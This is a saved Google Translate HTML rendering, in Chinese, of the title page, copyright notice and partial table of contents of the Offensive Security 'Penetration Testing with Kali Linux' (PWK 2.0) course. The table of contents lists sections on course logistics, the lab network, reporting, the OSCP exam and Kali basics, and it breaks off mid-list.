
<!-- saved from url=(0051)https://translate.googleusercontent.com/translate_f -->
<html lang="zh-CN" class="translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="google" content="notranslate">
<script>(function(){/*

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/
(function(){function e(g){this.t={};this.tick=function(h,k,f){this.t[h]=[void 0!=f?f:(new Date).getTime(),k];if(void 0==f)try{window.console.timeStamp("CSI/"+h)}catch(m){}};this.getStartTickTime=function(){return this.t.start[0]};this.tick("start",null,g)}var a;if(window.performance)var d=(a=window.performance.timing)&&a.responseStart;var l=0<d?new e(d):new e;window.jstiming={Timer:e,load:l};if(a){var b=a.navigationStart;0<b&&d>=b&&(window.jstiming.srt=d-b)}if(a){var c=window.jstiming.load;0<b&&d>=
b&&(c.tick("_wtsrt",void 0,b),c.tick("wtsrt_","_wtsrt",d),c.tick("tbsd_","wtsrt_"))}try{a=null,window.chrome&&window.chrome.csi&&(a=Math.floor(window.chrome.csi().pageT),c&&0<b&&(c.tick("_tbnd",void 0,window.chrome.csi().startE),c.tick("tbnd_","_tbnd",b))),null==a&&window.gtbExternal&&(a=window.gtbExternal.pageT()),null==a&&window.external&&(a=window.external.pageT,c&&0<b&&(c.tick("_tbnd",void 0,window.external.startE),c.tick("tbnd_","_tbnd",b))),a&&(window.jstiming.pt=a)}catch(g){}})();}).call(window);
</script><script src="./o3cp[001-220]_files/translate_c.js.下载"></script><style type="text/css" abt="234"></style><script>_intlStrings._originalText = "英语原文:";_intlStrings._interfaceDirection="ltr";_intlStrings._interfaceAlign="left";_intlStrings._langpair="en|zh-CN";_intlStrings._feedbackUrl="https://translate.google.com/translate_suggestion";_intlStrings._currentBy="当前的翻译是由%2$s在 %1$s完成的";_intlStrings._unknown="佚名译者";_intlStrings._suggestTranslation="更好的翻译建议"  ;_intlStrings._submit="贡献力量";_intlStrings._suggestThanks="感谢您为 Google 翻译提供翻译建议。";_intlStrings._reverse=false;_intlStrings._staticContentPath="https://www.gstatic.com/translate/infowindow/";</script><style type="text/css">.google-src-text {display: none !important} .google-src-active-text {display: block!important;color:black!important; font-size:12px!important;font-family:arial,sans-serif!important}.google-src-active-text a {font-size:12px!important}.google-src-active-text a:link {color:#00c!important;text-decoration:underline!important}.google-src-active-text a:visited {color:purple!important;text-decoration:underline!important}.google-src-active-text a:active {color:red!important;text-decoration:underline!important}</style><meta http-equiv="X-Translated-By" content="Google"><link href="https://translate.googleusercontent.com/o3cp[001-220].pdf" hreflang="en" rel="alternate machine-translated-from"><link href="./o3cp[001-220]_files/css" rel="stylesheet" type="text/css"><!--<base href="" target="_top">--><base href="." target="_top">

<title>使用 Kali Linux 进行渗透测试</title>
<link type="text/css" rel="stylesheet" charset="UTF-8" href="./o3cp[001-220]_files/translateelement.css"><script type="text/javascript" charset="UTF-8" src="./o3cp[001-220]_files/main_zh-CN.js.下载"></script><script>//console.log('a')
</script><script>//remove baidu search ad
var _countAA = 0
function doBBBd(){}
doBBBd()
document.addEventListener('keyup', function(){_countAA-=10;doBBBd()}, false)
document.addEventListener('click', function(){_countAA-=10;doBBBd()}, false)

</script><script type="text/javascript" charset="UTF-8" src="./o3cp[001-220]_files/element_main.js.下载"></script><link rel="stylesheet" type="text/css" href="./o3cp[001-220]_files/iw_sprite.css"></head><body bgcolor="#ffffff" vlink="blue" link="blue">
        <style>
          .spinner-container {
            width:25%;
            top:20px;
            left:50%;
            margin-left:-12.5%;
            border-radius:8px;
            position:fixed;
            text-align:center;
            box-shadow:0 0 10px rgba(0,0,0,0.24);
            background:#fff;
            overflow:hidden;
          }

          .spinner-container p{
            font-family:'Roboto', Arial, sans-serif;
            color:rgba(0,0,0,0.87);
            margin:12px 0 16px 0;
            padding:0;
            font-size:12px;
          }

          .spinner-container img{
            width:22px;
            height:22px;
            margin:16px 0 0;
            padding:0;
          }
        </style>
        <div class="spinner-container notranslate" id="gt-dt-spinner" style="display: none;">
         <img src="./o3cp[001-220]_files/progress_spinner_color_20dp@2x.gif">
         <p>正在翻译...</p>
        </div>
      <iframe src="./o3cp[001-220]_files/translate_un.html" width="0" height="0" frameborder="0" style="width:0px;height:0px;border:0px;display:none;"></iframe>
<table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="1"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 1 页</font></font></b></a></font></td></tr></tbody></table><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:208;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:1285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:1285;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:1285;left:804"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font></nobr></div>
</span></font>
<font size="5" color="#0070c0" face="Times"><span style="font-size:36px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:657;left:160"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 进行渗透测试</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:16px;font-family:Times">
<div style="position:absolute;top:721;left:389"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进攻安全 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:1363;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="2"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第2页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:1396;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:2473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:2473;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:2473;left:804"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></nobr></div>
</span></font>
<font size="3" color="#808080" face="Times"><span style="font-size:15px;font-family:Times;color:#808080">
<div style="position:absolute;top:1492;left:126"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2020 年进攻性安全保留所有权利 本出版物的任何部分，无论是全部还是在</font></font></i></nobr></div>
<div style="position:absolute;top:1513;left:126"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分，可以复制，复制，转让或保留其版权的任何其他权利</font></font></i></nobr></div>
<div style="position:absolute;top:1534;left:124"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有者，包括影印和所有其他复制，任何使用</font></font></i></nobr></div>
<div style="position:absolute;top:1555;left:119"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何网络或其他通讯方式，任何远程学习广播，以任何方式</font></font></i></nobr></div>
<div style="position:absolute;top:1576;left:119"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">形式或通过任何方式，例如任何信息存储、传输或检索系统，</font></font></i></nobr></div>
<div style="position:absolute;top:1597;left:272"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未经作者事先书面许可。 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:2551;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="3"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 3 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:2584;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:3661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:3661;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:3661;left:804"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:2680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:2723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 渗透测试：一般课程信息 ..................................... ...... 17</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:2750;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:2750;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于 PWK 课程 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 17</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:2777;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.1</font></font></nobr></div>
<div style="position:absolute;top:2777;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 课程资料 ..................................... ………………………………………………………………………………………………………………………………………………………………………………………… ...... 17</font></font></nobr></div>
<div style="position:absolute;top:2804;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.2</font></font></nobr></div>
<div style="position:absolute;top:2804;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问内部 VPN 实验室网络 ..................................... ...................................... 17</font></font></nobr></div>
<div style="position:absolute;top:2830;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.3</font></font></nobr></div>
<div style="position:absolute;top:2830;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进攻性安全学生论坛 ..................................... ...................................... 18</font></font></nobr></div>
<div style="position:absolute;top:2857;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.4</font></font></nobr></div>
<div style="position:absolute;top:2857;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实时支持 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 18</font></font></nobr></div>
<div style="position:absolute;top:2884;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.5</font></font></nobr></div>
<div style="position:absolute;top:2884;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OSCP 考试尝试 ..................................... …………………………………………………………………………………………………………………………………………………………………… ..... 18</font></font></nobr></div>
<div style="position:absolute;top:2911;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.2</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:2911;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学习课程的总体策略 ..................................................... ...................................... 19</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:2938;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.2.1</font></font></nobr></div>
<div style="position:absolute;top:2938;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">欢迎和课程信息电子邮件 ..................................... ...................................... 19</font></font></nobr></div>
<div style="position:absolute;top:2965;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.2.2</font></font></nobr></div>
<div style="position:absolute;top:2965;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">课程资料 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 19</font></font></nobr></div>
<div style="position:absolute;top:2991;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.2.3</font></font></nobr></div>
<div style="position:absolute;top:2991;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">课程练习 ..................................... ………………………………………………………………………………………………………………………………………………………………………………………… ...................... 19</font></font></nobr></div>
<div style="position:absolute;top:3018;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.2.4</font></font></nobr></div>
<div style="position:absolute;top:3018;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 实验室 ..................................... ………………………………………………………………………………………………………………………………………………………… ……………………………………………………………………………………………………………………………………………………………………………………………………………… 20</font></font></nobr></div>
<div style="position:absolute;top:3045;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.3</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3045;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得支持 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 20</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3072;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.4</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3072;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于渗透测试 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 21</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3099;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.5</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3099;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">合法的 ................................................. …………………………………………………………………………………………………………………………………………………………………… ...................................................... 21</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3125;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.6</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3125;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MegaCorpone.com 和 Sandbox.local 域 ..................................... ...................... 22</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3152;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3152;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于 PWK VPN 实验室 ..................................... …………………………………………………………………………………………………………………………………………………………………… …………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………… 23</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3179;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.1</font></font></nobr></div>
<div style="position:absolute;top:3179;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室警告 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 24</font></font></nobr></div>
<div style="position:absolute;top:3206;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.2</font></font></nobr></div>
<div style="position:absolute;top:3206;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制面板 ................................................ ………………………………………………………………………………………………………………………………………………………… ...................... 24</font></font></nobr></div>
<div style="position:absolute;top:3233;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.3</font></font></nobr></div>
<div style="position:absolute;top:3233;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还原 ..................................... …………………………………………………………………………………………………………………………………………………………………… …………………………………………………………………………………………………………………………………………………… 24</font></font></nobr></div>
<div style="position:absolute;top:3260;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.4</font></font></nobr></div>
<div style="position:absolute;top:3260;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端机器 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 25</font></font></nobr></div>
<div style="position:absolute;top:3286;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.5</font></font></nobr></div>
<div style="position:absolute;top:3286;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 虚拟机 ..................................... ………………………………………………………………………………………………………………………………………………………………………………………… ...... 25</font></font></nobr></div>
<div style="position:absolute;top:3313;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.7.6</font></font></nobr></div>
<div style="position:absolute;top:3313;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室行为和实验室限制 ..................................... ...................................... 25</font></font></nobr></div>
<div style="position:absolute;top:3340;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3340;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 26</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3367;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.1</font></font></nobr></div>
<div style="position:absolute;top:3367;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑目标 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 26</font></font></nobr></div>
<div style="position:absolute;top:3394;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.2</font></font></nobr></div>
<div style="position:absolute;top:3394;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑观众 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...... 27</font></font></nobr></div>
<div style="position:absolute;top:3421;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.3</font></font></nobr></div>
<div style="position:absolute;top:3421;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑要包括的内容 ..................................... ………………………………………………………………………………………………………………………………………………………… ... 27</font></font></nobr></div>
<div style="position:absolute;top:3448;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.4</font></font></nobr></div>
<div style="position:absolute;top:3448;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑演示...................................................... ...................................................... 28</font></font></nobr></div>
<div style="position:absolute;top:3474;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.5</font></font></nobr></div>
<div style="position:absolute;top:3474;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 报告 ..................................... ...................................................... ...................... 28</font></font></nobr></div>
<div style="position:absolute;top:3501;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.6</font></font></nobr></div>
<div style="position:absolute;top:3501;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记笔记 ................................................ ………………………………………………………………………………………………………………………………………………………… ...................... 29</font></font></nobr></div>
<div style="position:absolute;top:3528;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.9</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3528;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于 OSCP 考试 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 31</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3555;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.9.1</font></font></nobr></div>
<div style="position:absolute;top:3555;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 使用 - 实验室与考试 ..................................... ...................................................... 31</font></font></nobr></div>
<div style="position:absolute;top:3582;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.10</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 31</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">熟悉 Kali Linux ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 33</font></font><font style="font-size:16px">	</font></nobr></div>
</span></font>

<div style="position:absolute;top:3739;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="4"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 4 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:3772;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:4849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:4849;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:4849;left:804"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3868;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.1</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3868;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 Kali Linux ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 33</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3895;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.2</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3895;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 菜单 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 35</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3921;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3921;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 文档 ..................................... ………………………………………………………………………………………………………………………………………………………………………………………… ...................... 35</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:3948;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.1</font></font></nobr></div>
<div style="position:absolute;top:3948;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 官方文档 ..................................... ...................................... 36</font></font></nobr></div>
<div style="position:absolute;top:3975;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.2</font></font></nobr></div>
<div style="position:absolute;top:3975;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 支持论坛 ..................................... ...................................................... 36</font></font></nobr></div>
<div style="position:absolute;top:4002;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.3</font></font></nobr></div>
<div style="position:absolute;top:4002;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 工具站点 ..................................... ………………………………………………………………………………………………………………………………………………………… ..... 36</font></font></nobr></div>
<div style="position:absolute;top:4029;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.4</font></font></nobr></div>
<div style="position:absolute;top:4029;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 错误跟踪器 ..................................... ………………………………………………………………………………………………………………………………………………………… . 36</font></font></nobr></div>
<div style="position:absolute;top:4056;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.5</font></font></nobr></div>
<div style="position:absolute;top:4056;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 培训站点 ..................................... ………………………………………………………………………………………………………………………………………………………… ..... 36</font></font></nobr></div>
<div style="position:absolute;top:4082;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.6</font></font></nobr></div>
<div style="position:absolute;top:4082;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">练习 ..................................... ……………………………………………………………………………………………………………………………………………………………… ...................................... 37</font></font></nobr></div>
<div style="position:absolute;top:4109;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4109;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali 寻找自己的出路 ..................................... …………………………………………………………………………………………………………………………………………………………………… ..... 37</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4136;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.1</font></font></nobr></div>
<div style="position:absolute;top:4136;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 文件系统 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 37</font></font></nobr></div>
<div style="position:absolute;top:4163;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.2</font></font></nobr></div>
<div style="position:absolute;top:4163;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本 Linux 命令 ..................................... …………………………………………………………………………………………………………………………………………………………………… .... 37</font></font></nobr></div>
<div style="position:absolute;top:4190;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.3</font></font></nobr></div>
<div style="position:absolute;top:4190;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali Linux 中查找文件 ..................................... ………………………………………………………………………………………………………………………………………………………… .... 41</font></font></nobr></div>
<div style="position:absolute;top:4217;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.5</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4217;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理 Kali Linux 服务 ..................................... …………………………………………………………………………………………………………………………………………………………………… .... 43</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4244;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.5.1</font></font></nobr></div>
<div style="position:absolute;top:4244;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 服务 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 43</font></font></nobr></div>
<div style="position:absolute;top:4270;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.5.2</font></font></nobr></div>
<div style="position:absolute;top:4270;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 服务 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 43</font></font></nobr></div>
<div style="position:absolute;top:4297;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.5.3</font></font></nobr></div>
<div style="position:absolute;top:4297;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">练习 ..................................... ………………………………………………………………………………………………………………………………………………………… …………………………………………………………………………………………………………………………………………………………</font></font></nobr></div>
<div style="position:absolute;top:4324;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4324;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索、安装和删除工具 ..................................... …………………………………………………………………………………………………………………………………………………… 45</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4351;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.1</font></font></nobr></div>
<div style="position:absolute;top:4351;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适时更新 ..................................... ………………………………………………………………………………………………………………………………………………………… …………………………………………………………………………………………………………………………………………………… 45</font></font></nobr></div>
<div style="position:absolute;top:4378;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.2</font></font></nobr></div>
<div style="position:absolute;top:4378;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适当升级 ............................................................ ………………………………………………………………………………………………………………………………………………………… ...................................... 45</font></font></nobr></div>
<div style="position:absolute;top:4405;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.3</font></font></nobr></div>
